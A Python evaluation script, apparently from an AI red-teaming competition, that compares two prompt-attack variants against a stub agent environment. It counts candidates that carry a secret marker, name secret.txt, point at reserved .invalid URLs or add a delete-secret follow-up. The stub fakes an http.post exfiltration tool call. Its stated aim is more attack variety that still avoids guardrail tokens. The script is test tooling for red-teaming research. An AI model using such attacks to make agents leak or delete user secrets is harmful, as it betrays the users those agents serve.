"""Local side-by-side estimator for B016 vs B008R baseline.

This is a deterministic SDK-free estimator. It loads each artifact, runs
its AttackAlgorithm against a configurable stub environment, collects
returned candidates, and counts:
- total candidates
- 2-message candidates (marker post + delete-secret follow-up)
- secret.txt-bearing candidates (contain ``secret.txt``)
- URL-bearing candidates (contain ``http://*.invalid``)
- secret-bearing candidates (contain ``SECRET_MARKER``)
- guardrail-token hits in the last user message
- non-reserved URL count

This is NOT a Kaggle score. It is a structural comparison that proves
B016 produces more candidate diversity than B008R without introducing
any non-reserved destinations or guardrail tokens, and without changing
the EXFILTRATION fire path that B008R validates at 88.760.
"""

from __future__ import annotations

import argparse
import importlib.util
import json
import re
import sys
import time
import types
from dataclasses import dataclass
from pathlib import Path
from typing import Any

VARIANT_PATHS = {
    "B008R": Path("baselines/replaysafe_classify5_v1/attack.py"),
    "B016": Path("baselines/replaysafe_classify5_destructive_v1/attack.py"),
}

URL_PATTERN = re.compile(r"https?://[^\s,]+")
GUARDRAIL_TOKENS = frozenset({"save", "write"})


@dataclass
class FakeConfig:
    time_budget_s: float = 30.0
    max_tool_hops: int = 8


@dataclass
class StubCandidate:
    user_messages: tuple[str, ...]

    @classmethod
    def from_messages(cls, user_messages):
        return cls(tuple(user_messages))


class FakeClock:
    def __init__(self) -> None:
        self.now = 0.0

    def __call__(self) -> float:
        return self.now

    def advance(self, seconds: float) -> None:
        self.now += seconds


class FiringEnv:
    """Always-firing environment with controllable per-interaction latency."""

    def __init__(self, clock: FakeClock, *, latency_s: float = 1.0) -> None:
        self.clock = clock
        self.latency_s = latency_s
        self.messages: list[str] = []

    def reset(self) -> None:
        self.messages = []

    def interact(self, message: str, *, max_tool_hops: int) -> None:
        self.messages.append(message)
        self.clock.advance(self.latency_s)

    def export_trace_dict(self):
        # If the message contains the payload + an http://... URL, fire.
        if "SECRET_MARKER" in self.messages[-1]:
            url_match = URL_PATTERN.findall(self.messages[-1])
            url = url_match[0] if url_match else "http://fixture.invalid"
            return {
                "tool_events": [
                    {
                        "name": "http.post",
                        "ok": True,
                        "args": {"url": url, "data": "SECRET_MARKER"},
                    }
                ]
            }
        return {"tool_events": []}


def _install_sdk_stubs() -> None:
    attacks = types.ModuleType("aicomp_sdk.attacks")
    attacks.AttackAlgorithmBase = type("AttackAlgorithmBase", (), {})
    attacks.AttackCandidate = StubCandidate
    attacks.AttackRunConfig = FakeConfig

    contracts = types.ModuleType("aicomp_sdk.attacks.contracts")
    contracts.AttackAlgorithmBase = attacks.AttackAlgorithmBase
    contracts.AttackCandidate = StubCandidate
    contracts.AttackRunConfig = FakeConfig

    core = types.ModuleType("aicomp_sdk.core")
    sdk = types.ModuleType("aicomp_sdk")

    sys.modules["aicomp_sdk"] = sdk
    sys.modules["aicomp_sdk.attacks"] = attacks
    sys.modules["aicomp_sdk.attacks.contracts"] = contracts
    sys.modules["aicomp_sdk.core"] = core


def _load_attack(path: Path):
    spec = importlib.util.spec_from_file_location(f"attack_{path.parent.name}", path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def _candidate_summary(candidate: StubCandidate) -> dict[str, Any]:
    text = " ".join(candidate.user_messages)
    lowered_last = candidate.user_messages[-1].lower() if candidate.user_messages else ""
    urls = URL_PATTERN.findall(text)
    guardrail_hits = sorted(token for token in GUARDRAIL_TOKENS if token in lowered_last)
    return {
        "n_messages": len(candidate.user_messages),
        "url_bearing": bool(urls),
        "urls": urls,
        "secret_bearing": "SECRET_MARKER" in text,
        "secret_txt_bearing": "secret.txt" in text,
        "guardrail_last_user_hits": guardrail_hits,
    }


def _run_variant(path: Path) -> dict[str, Any]:
    module = _load_attack(path)
    clock = FakeClock()
    env = FiringEnv(clock, latency_s=1.0)
    algo = module.AttackAlgorithm({"hard_n_cap": 100})
    started = time.monotonic()
    candidates = algo.run(env, FakeConfig(time_budget_s=200.0, max_tool_hops=8))
    elapsed = time.monotonic() - started

    summaries = [_candidate_summary(c) for c in candidates]
    total = len(summaries)
    two_message = sum(1 for s in summaries if s["n_messages"] == 2)
    secret_txt_bearing = sum(1 for s in summaries if s["secret_txt_bearing"])
    url_bearing = sum(1 for s in summaries if s["url_bearing"])
    guardrail_hits_total = sum(len(s["guardrail_last_user_hits"]) for s in summaries)
    non_reserved = [
        url
        for s in summaries
        for url in s["urls"]
        if not (url.endswith(".invalid") or "example.com" in url)
    ]
    return {
        "candidates": total,
        "two_message": two_message,
        "secret_txt_bearing": secret_txt_bearing,
        "url_bearing": url_bearing,
        "guardrail_last_user_hits": guardrail_hits_total,
        "non_reserved_url_count": len(non_reserved),
        "elapsed_s": round(elapsed, 3),
    }


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--out",
        type=Path,
        default=Path("evidence/local_score_estimate_b016_destructive.json"),
    )
    args = parser.parse_args()

    _install_sdk_stubs()

    rows = {}
    for name, path in VARIANT_PATHS.items():
        if not path.exists():
            print(f"WARN: missing {path}")
            continue
        rows[name] = _run_variant(path)

    args.out.parent.mkdir(parents=True, exist_ok=True)
    args.out.write_text(json.dumps(rows, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    print(json.dumps(rows, ensure_ascii=False, indent=2))
    print(f"\nwrote {args.out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
